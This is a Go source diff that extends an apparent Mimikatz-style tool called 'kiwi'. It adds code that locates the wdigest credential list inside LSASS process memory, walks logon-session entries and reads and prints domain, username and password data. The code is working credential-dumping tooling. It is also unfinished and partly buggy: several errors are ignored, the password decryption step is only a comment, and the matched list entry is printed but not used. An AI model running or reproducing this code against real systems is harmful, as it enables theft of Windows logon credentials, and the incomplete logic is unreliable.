@@ -2,6 +2,7 @@ package kiwi
 
 import (
 	"bytes"
+	"fmt"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -29,12 +30,12 @@ var (
 	}
 )
 
-func (kiwi *Kiwi) searchWdigestListAddress(pHandle windows.Handle) error {
+func (kiwi *Kiwi) searchWdigestCredentialAddress(pHandle windows.Handle) error {
 	wdigest, err := kiwi.getLSASSBasicModuleInfo(pHandle, "wdigest.DLL")
 	if err != nil {
 		return err
 	}
-	// read lsasrv.dll memory
+	// read wdigest.dll memory
 	memory := make([]byte, wdigest.size)
 	_, err = api.ReadProcessMemory(pHandle, wdigest.address, &memory[0], uintptr(wdigest.size))
 	if err != nil {
@@ -45,19 +46,116 @@ func (kiwi *Kiwi) searchWdigestListAddress(pHandle windows.Handle) error {
 
 	index := bytes.Index(memory, patch.search.data)
 	if index == -1 {
-		return errors.WithMessage(err, "failed to search wdigest reference pattern")
+		return errors.WithMessage(err, "failed to search wdigest primary pattern")
 	}
 	address := wdigest.address + uintptr(index+patch.offsets.off0)
 	var offset int32
 	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
 	if err != nil {
-		return errors.WithMessage(err, "failed to read offset about wdigest list address")
+		return errors.WithMessage(err, "failed to read offset about wdigest credential address")
 	}
-	wdigestListAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
-	kiwi.logf(logger.Debug, "wdigest list address is 0x%X", wdigestListAddr)
+	wdigestCredAddr := address + unsafe.Sizeof(offset) + uintptr(offset)
+	kiwi.logf(logger.Debug, "wdigest credential address is 0x%X", wdigestCredAddr)
+	kiwi.wdigestPrimaryOffset = patch.offsets.off1
+	kiwi.wdigestCredAddr = wdigestCredAddr
 	return nil
 }
 
-func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, session *LogonSession) error {
-	return nil
+type wdigestListEntry struct {
+	fLink      uintptr
+	bLink      uintptr
+	usageCount uint32
+	this       uintptr
+	luid       windows.LUID
+}
+
+type genericPrimaryCredential struct {
+	Username api.LSAUnicodeString
+	Domain   api.LSAUnicodeString
+	Password api.LSAUnicodeString
+}
+
+// Wdigest contains credential information.
+type Wdigest struct {
+	Domain   string
+	Username string
+	Password string
+}
+
+func (kiwi *Kiwi) getWdigestList(pHandle windows.Handle, logonID windows.LUID) ([]*Wdigest, error) {
+	kiwi.mu.Lock()
+	defer kiwi.mu.Unlock()
+	if kiwi.wdigestCredAddr == 0 {
+		err := kiwi.searchWdigestCredentialAddress(pHandle)
+		if err != nil {
+			return nil, errors.WithMessage(err, "failed to search wdigest credential address")
+		}
+	}
+	address := kiwi.wdigestCredAddr
+	// read wdigest credential data address
+	var addr uintptr
+	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
+	if err != nil {
+		return nil, errors.WithMessage(err, "failed to read wdigest credential list address")
+	}
+	kiwi.logf(logger.Debug, "wdigest credential data address is 0x%X", addr)
+	// read linked list address by LUID
+	var resultAddr uintptr // TODO for what?
+	for {
+		if addr == address {
+			break
+		}
+		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
+		var entry wdigestListEntry
+		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
+		if err != nil {
+			break
+		}
+		if logonID == entry.luid {
+			resultAddr = addr
+			break
+		}
+		addr = entry.fLink
+	}
+	fmt.Printf("0x%X\n", resultAddr)
+
+	size := uintptr(kiwi.wdigestPrimaryOffset + int(unsafe.Sizeof(genericPrimaryCredential{})))
+
+	var cred genericPrimaryCredential
+	credAddr := uintptr(int(addr) + kiwi.wdigestPrimaryOffset)
+	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
+	if err != nil {
+		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
+	}
+
+	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)
+
+	username, err := api.ReadLSAUnicodeString(pHandle, &cred.Username)
+
+	if username == "" {
+		return nil, nil
+	}
+
+	// read encrypted password
+	lus := cred.Password
+	if lus.MaximumLength != 0 {
+		data := make([]byte, int(lus.MaximumLength))
+		_, err := api.ReadProcessMemory(pHandle, lus.Buffer, &data[0], uintptr(lus.MaximumLength))
+		if err != nil {
+
+		}
+		fmt.Println(data)
+
+	}
+
+	password, err := api.ReadLSAUnicodeString(pHandle, &cred.Password)
+
+	// decrypt password
+
+	fmt.Println("Domain:", domain)
+	fmt.Println("Username:", username)
+	fmt.Println("Password:", password)
+
+	return nil, nil
+
 }
